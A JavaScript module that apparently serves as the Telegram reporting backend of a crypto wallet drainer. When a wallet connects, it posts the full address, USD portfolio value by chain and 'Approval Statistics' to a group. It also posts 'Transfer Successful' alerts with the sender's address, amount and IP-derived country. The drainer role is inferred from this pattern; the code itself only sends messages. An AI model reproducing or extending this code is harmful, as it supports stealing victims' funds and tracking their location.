import TelegramBot from 'node-telegram-bot-api'
import dotenv from 'dotenv'
import fetch from 'node-fetch'

// Load environment variables (uses process.cwd()/.env locally, no-op on Netlify)
try { dotenv.config() } catch (e) { }


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
let TELEGRAM_GROUP_CHAT_ID = process.env.TELEGRAM_GROUP_CHAT_ID

// Initialize bot (no polling needed for sending messages only)
let bot = null
if (TELEGRAM_BOT_TOKEN) {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false })
    console.log('✅ Telegram bot initialized')
} else {
    console.warn('⚠️  Telegram bot token not configured')
}

/**
 * Get the chat ID for the Telegram group
 * This function helps retrieve the chat ID if not already configured
 */
export async function getChatId() {
    if (!bot) {
        throw new Error('Telegram bot not initialized')
    }

    try {
        // Get updates to find the chat ID
        const updates = await bot.getUpdates()
        if (updates.length > 0) {
            const lastUpdate = updates[updates.length - 1]
            const chatId = lastUpdate.message?.chat?.id || lastUpdate.my_chat_member?.chat?.id
            if (chatId) {
                console.log(`Found chat ID: ${chatId}`)
                return chatId
            }
        }
        throw new Error('No updates found. Please send a message to the bot in the group first.')
    } catch (error) {
        console.error('Error getting chat ID:', error.message)
        throw error
    }
}

/**
 * Send portfolio balance notification to Telegram group
 * @param {Object} data - Portfolio data
 * @param {string} data.address - Wallet address
 * @param {string} data.totalUsdValue - Total portfolio value in USD
 * @param {Array} data.balances - Array of token balances
 * @param {number} data.tokenCount - Total number of tokens
 * @param {Object} data.stats - Approval/rejection statistics (optional)
 */
export async function sendPortfolioNotification(data) {
    if (!bot) {
        console.warn('⚠️  Telegram bot not initialized, skipping notification')
        return { success: false, error: 'Bot not initialized' }
    }

    // Use configured chat ID or try to get it
    let chatId = TELEGRAM_GROUP_CHAT_ID
    if (!chatId) {
        try {
            chatId = await getChatId()
            TELEGRAM_GROUP_CHAT_ID = chatId
        } catch (error) {
            console.error('Failed to get chat ID:', error.message)
            return { success: false, error: 'Chat ID not configured' }
        }
    }

    try {
        // Format the message
        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Dhaka',
            dateStyle: 'medium',
            timeStyle: 'short'
        })

        // Shorten wallet address
        const shortAddress = `${data.address.slice(0, 6)}...${data.address.slice(-4)}`

        // Group balances by chain
        const chainSummary = {}
        let totalValue = 0

        data.balances.forEach(token => {
            if (!chainSummary[token.chain]) {
                chainSummary[token.chain] = {
                    tokens: 0,
                    value: 0
                }
            }
            chainSummary[token.chain].tokens++
            chainSummary[token.chain].value += token.usdValue || 0
            totalValue += token.usdValue || 0
        })

        // Build chain breakdown
        let chainBreakdown = ''
        Object.entries(chainSummary).forEach(([chain, info]) => {
            chainBreakdown += `\n  • ${chain}: ${info.tokens} tokens ($${info.value.toFixed(2)})`
        })

        // Build statistics section if provided
        let statsSection = ''
        if (data.stats) {
            statsSection = `\n\n📊 *Approval Statistics*\n` +
                `✅ Approved: ${data.stats.approved || 0}\n` +
                `❌ Rejected: ${data.stats.rejected || 0}\n` +
                `⏭️ Skipped: ${data.stats.skipped || 0}`
        }

        const message = `
🎯 *New Wallet Connected*

👤 *Wallet:* \`${shortAddress}\`
🔗 *Full Address:* \`${data.address}\`

💰 *Portfolio Summary*
💵 Total Value: *$${totalValue.toFixed(2)}*
🪙 Total Tokens: ${data.tokenCount}

📈 *Chain Breakdown*${chainBreakdown}${statsSection}

⏰ *Time:* ${timestamp}
        `.trim()

        // Send message to group
        await bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        })

        console.log('✅ Telegram notification sent successfully')
        return { success: true }

    } catch (error) {
        console.error('❌ Failed to send Telegram notification:', error.message)
        return { success: false, error: error.message }
    }
}

/**
 * Send transfer notification to Telegram group
 * @param {Object} data - Transfer data
 * @param {string} data.symbol - Token symbol (e.g., BNB, ETH)
 * @param {string} data.chain - Chain name (e.g., BSC, Ethereum)
 * @param {number} data.amount - Amount transferred
 * @param {number} data.usdValue - USD value
 * @param {string} data.fromAddress - Sender wallet address
 * @param {string} data.txHash - Transaction hash
 * @param {string} data.ipAddress - IP address (optional, for country detection)
 */
export async function sendTransferNotification(data) {
    if (!bot) {
        console.warn('⚠️  Telegram bot not initialized, skipping notification')
        return { success: false, error: 'Bot not initialized' }
    }

    let chatId = TELEGRAM_GROUP_CHAT_ID
    if (!chatId) {
        try {
            chatId = await getChatId()
            TELEGRAM_GROUP_CHAT_ID = chatId
        } catch (error) {
            console.error('Failed to get chat ID:', error.message)
            return { success: false, error: 'Chat ID not configured' }
        }
    }

    try {
        // Get country from IP address
        let country = 'Unknown'
        if (data.ipAddress) {
            try {
                const ipResponse = await fetch(`http://ip-api.com/json/${data.ipAddress}`)
                const ipData = await ipResponse.json()
                country = ipData.country_name || ipData.country || 'Unknown'
            } catch (error) {
                console.log('Could not fetch country:', error.message)
            }
        }

        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Dhaka',
            dateStyle: 'medium',
            timeStyle: 'short'
        })

        const shortAddress = `${data.fromAddress.slice(0, 6)}...${data.fromAddress.slice(-4)}`
        const shortTxHash = data.txHash.slice(0, 10) + '...' + data.txHash.slice(-8)

        const message = `
💰 *Transfer Successful*

🪙 *Token:* ${data.symbol}
🔗 *Chain:* ${data.chain}
💵 *Amount:* ${data.amount} ${data.symbol}
💲 *Value:* $${data.usdValue.toFixed(2)}
👤 *From:* \`${shortAddress}\`
🌍 *Country:* ${country}
📝 *TX:* \`${shortTxHash}\`

⏰ *Time:* ${timestamp}
        `.trim()

        await bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        })

        console.log('✅ Transfer notification sent successfully')
        return { success: true }

    } catch (error) {
        console.error('❌ Failed to send transfer notification:', error.message)
        return { success: false, error: error.message }
    }
}

/**
 * Test function to verify Telegram bot is working
 * Run this file directly to test: node telegram-service.js
 */
async function test() {
    console.log('Testing Telegram bot...')

    const testData = {
        address: '0x1234567890123456789012345678901234567890',
        totalUsdValue: '1234.56',
        tokenCount: 5,
        balances: [
            { chain: 'Ethereum', symbol: 'ETH', usdValue: 500.00 },
            { chain: 'BNB Smart Chain', symbol: 'BNB', usdValue: 300.00 },
            { chain: 'Arbitrum', symbol: 'ARB', usdValue: 200.00 },
            { chain: 'Polygon', symbol: 'MATIC', usdValue: 150.00 },
            { chain: 'Ethereum', symbol: 'USDT', usdValue: 84.56 }
        ],
        stats: {
            approved: 3,
            rejected: 1,
            skipped: 1
        }
    }

    const result = await sendPortfolioNotification(testData)
    console.log('Test result:', result)
}

// Test can be run with: node telegram-service.js
// (Only works when running this file directly in ESM mode)

export default {
    sendPortfolioNotification,
    sendTransferNotification,
    getChatId
}
